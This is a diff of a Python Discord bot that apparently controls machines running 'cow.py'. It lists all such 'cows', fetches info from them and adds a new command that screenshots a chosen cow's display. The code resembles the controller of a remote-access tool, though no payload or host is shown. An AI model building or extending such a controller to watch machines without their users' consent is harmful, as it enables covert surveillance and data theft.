@@ -48,20 +48,28 @@ async def on_ready():
     print(f"{bot.user.name} is ready!")
     await bot.tree.sync()  # Sync commands to Discord
 
+# Command to list all cows that have ever connected
+@bot.tree.command(name="listcows", description="List all machines that have ever run cow.py")
+async def listCows(interaction: discord.Interaction):
+    await interaction.response.send_message("Listing all cows ever seen...")
+    machines = connect(":LISTCOWS")  # Get the list of cows
+    await interaction.edit_original_response(content=f"```{machines}```") # Send the list back to the user
+
 # Command to fetch the info of a specific cow
 @bot.tree.command(name="getinfo", description="Get info of cow")
 @app_commands.describe(cow="The cow's name")
 async def getInfo(interaction: discord.Interaction, cow: str):
     await interaction.response.send_message("Attempting to get info...")
     info = run_remote_command(cow, "GETINFO")  # Run the command to get info
-    await interaction.followup.send(f"```{info}```")  # Send the info back to the user
+    await interaction.edit_original_response(content=f"```{info}```") # Send the info back to the user
 
-# Command to list all cows that have ever connected
-@bot.tree.command(name="listcows", description="List all machines that have ever run cow.py")
-async def listCows(interaction: discord.Interaction):
-    await interaction.response.send_message("Listing all cows ever seen...")
-    machines = connect(":LISTCOWS")  # Get the list of cows
-    await interaction.followup.send(f"```{machines}```")  # Send the list back to the user
+#Get screenshot of a specific cow
+@bot.tree.command(name="getscreenshot", description="Screenshot the cow's current display")
+@app_commands.describe(cow="The cow's name")
+async def getScreenshot(interaction: discord.Interaction, cow: str):
+    await interaction.response.send_message("Attempting to get screenshot...")
+    screenshot = run_remote_command(cow, "GETSCREENSHOT")  # Run the command to get screenshot
+    await interaction.edit_original_response(content=screenshot) # Send the info back to the user
 
 # Run the bot with the provided token
 bot.run(token, log_handler=handler, log_level=logging.DEBUG)
